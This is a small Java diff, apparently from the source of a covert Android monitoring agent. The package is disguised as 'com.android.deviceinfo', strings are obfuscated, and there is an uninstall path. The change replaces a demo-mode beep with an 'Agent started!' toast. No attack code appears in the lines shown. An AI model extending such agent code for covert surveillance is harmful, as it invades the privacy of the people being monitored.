@@ -20,6 +20,7 @@ import android.net.ConnectivityManager;
 import android.net.wifi.WifiManager;
 import android.os.PowerManager;
 import android.os.PowerManager.WakeLock;
+import android.widget.Toast;
 
 import com.android.deviceinfo.action.Action;
 import com.android.deviceinfo.action.SubAction;
@@ -269,7 +270,8 @@ public class Core extends Activity implements Runnable {
 				}
 
 				if (Cfg.DEMO) {
-					Beep.beepPenta();
+					//Beep.beepPenta();
+					Toast.makeText(this, M.e("Agent started!"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 				}
 
 				// Torna true in caso di UNINSTALL o false in caso di stop del
